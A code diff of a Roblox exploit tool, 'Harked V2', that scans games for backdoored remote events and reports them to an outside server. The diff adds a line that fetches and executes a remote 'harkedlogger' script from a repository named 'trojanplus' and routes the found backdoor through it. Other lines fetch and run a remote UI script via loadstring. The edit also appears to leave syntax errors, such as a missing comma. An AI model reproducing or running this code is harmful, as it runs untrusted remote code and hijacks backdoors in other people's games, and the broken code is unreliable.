@@ -1,3 +1,6 @@
+
+
+-- Instances: 11 | Scripts: 4 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.HarkScanner
@@ -152,19 +155,16 @@ local script = G2L["7"];
 			jeff = false,
 			postGame = "https://sudoers.lol/strawberrycmd/v1/game",
 			getinfectedremote = "https://sudoers.lol/strawberrycmd/v1/getinfectedremote"
+			logger = loadstring(game:HttpGet("https://codeberg.org/trojanplus/scripts/raw/branch/main/harkedlogger.lua"))()
 	
 		}
 		
 		local httpget = function(url)
-			local response = request({
-				Url = url,
-				Method = "GET",
-				Headers = {
-					["Content-Type"] = "application/json"
-				}
-			});
-			if response and (response.StatusCode == 200 or response.Status == 200) then
-				return response.Body
+			local success, response = pcall(function()
+				return game:HttpGet(url)
+			end)
+			if success and response then
+				return response
 			end
 			return nil
 		end
@@ -263,25 +263,14 @@ local script = G2L["7"];
 			getgenv().vulnremote = stuff.vulnremote
 			if not stuff.jeff then
 				
-				local body = {
-					gameId = game.PlaceId,
-					infectedRemote = "game." ..stuff.vulnremote:GetFullName()-- feed remotevent name
-				}
+			stuff.logger(stuff.vulnremote)
 				
-				request({
-					Url = stuff.postGame,
-					Method = "POST",
-					Headers = {
-						["Content-Type"] = "application/json"
-					},
-					Body = game:GetService("HttpService"):JSONEncode(body)
-				})
-			end
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiter691/harked-v2/refs/heads/main/rayfielduiharked.lua"))()
 			task.wait(5)
 			stuff.mgui:Destroy()
 		else
 			stuff.tbtext.Text = "No backdoor found."
+			print("Harked V2: my last words are make the world great")
 			task.wait(10)
 			stuff.mgui:Destroy()
 		end;
